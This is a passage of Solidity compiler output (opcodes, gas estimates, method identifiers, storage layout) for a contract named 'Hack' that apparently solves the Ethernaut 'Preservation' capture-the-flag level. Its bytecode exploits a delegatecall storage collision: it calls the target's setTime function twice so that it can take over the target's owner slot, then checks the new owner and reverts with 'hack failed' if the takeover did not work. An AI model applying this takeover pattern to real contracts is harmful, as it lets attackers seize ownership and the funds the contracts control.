SUB SWAP1 RETURN JUMPDEST PUSH2 0xB9 PUSH2 0x177 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xC6 SWAP2 SWAP1 PUSH2 0x3B0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xE9 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xE4 SWAP2 SWAP1 PUSH2 0x466 JUMP JUMPDEST PUSH2 0x19C JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH1 0x2 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF1E02620 ADDRESS PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1EB SWAP2 SWAP1 PUSH2 0x4A0 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x202 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x214 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF1E02620 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x267 SWAP2 SWAP1 PUSH2 0x4A0 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x27E JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x290 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x8DA5CB5B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2F4 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x318 SWAP2 SWAP1 PUSH2 0x4E3 JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x36E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x365 SWAP1 PUSH2 0x568 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x39A DUP3 PUSH2 0x371 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3AA DUP2 PUSH2 0x390 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x3C3 PUSH0 DUP4 ADD DUP5 PUSH2 0x3A1 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x3DF DUP2 PUSH2 0x3CD JUMP JUMPDEST DUP2 EQ PUSH2 0x3E9 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x3FA DUP2 PUSH2 0x3D6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x415 JUMPI PUSH2 0x414 PUSH2 0x3C9 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x422 DUP5 DUP3 DUP6 ADD PUSH2 0x3EC JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x435 DUP3 PUSH2 0x390 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x445 DUP2 PUSH2 0x42B JUMP JUMPDEST DUP2 EQ PUSH2 0x44F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x460 DUP2 PUSH2 0x43C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x47B JUMPI PUSH2 0x47A PUSH2 0x3C9 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x488 DUP5 DUP3 DUP6 ADD PUSH2 0x452 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x49A DUP2 PUSH2 0x3CD JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4B3 PUSH0 DUP4 ADD DUP5 PUSH2 0x491 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x4C2 DUP2 PUSH2 0x390 JUMP JUMPDEST DUP2 EQ PUSH2 0x4CC JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x4DD DUP2 PUSH2 0x4B9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x4F8 JUMPI PUSH2 0x4F7 PUSH2 0x3C9 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x505 DUP5 DUP3 DUP6 ADD PUSH2 0x4CF JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x6861636B206661696C6564000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x552 PUSH1 0xB DUP4 PUSH2 0x50E JUMP JUMPDEST SWAP2 POP PUSH2 0x55D DUP3 PUSH2 0x51E JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x57F DUP2 PUSH2 0x546 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 KECCAK256 DUP5 0x26 0xB3 0xDB CODESIZE JUMP 0x2C CALLER PUSH29 0xF3450D61B4EDB4BE42B75C36F33C4CF6284D0A92679F64736F6C634300 ADDMOD SHR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "293600",
						"executionCost": "329",
						"totalCost": "293929"
					},
					"external": {
						"attack(address)": "infinite",
						"owner()": "2552",
						"setTime(uint256)": "24667",
						"timeZone1Library()": "2529",
						"timeZone2Library()": "2486"
					}
				},
				"methodIdentifiers": {
					"attack(address)": "d018db3e",
					"owner()": "8da5cb5b",
					"setTime(uint256)": "3beb26c4",
					"timeZone1Library()": "3dc79422",
					"timeZone2Library()": "27d6974f"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 14,
						"contract": "contracts/Preservation.sol:Hack",
						"label": "timeZone1Library",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 16,
						"contract": "contracts/Preservation.sol:Hack",
						"label": "timeZone2Library",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					},
					{
						"astId": 18,
						"contract": "contracts/Preservation.sol:Hack",
						"label": "owner",
						"offset": 0,
						"slot": "2",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}